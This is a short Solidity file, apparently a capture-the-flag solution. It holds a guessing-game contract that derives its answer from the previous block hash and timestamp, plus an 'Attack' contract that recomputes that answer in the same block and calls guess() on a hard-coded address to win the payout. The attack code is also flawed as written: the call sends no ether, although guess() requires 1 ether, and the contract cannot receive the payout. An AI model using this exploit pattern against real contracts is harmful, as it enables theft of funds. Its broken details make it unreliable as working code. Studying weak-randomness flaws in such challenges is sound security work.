 pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract Attack {
    address vt = 0x2417929C9AE5884a754Cf1f77FA5FaBDDC9ce92A;
    GuessTheNewNumberChallenge gn = GuessTheNewNumberChallenge(vt);
    function attack() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        gn.guess(answer);
    }
}
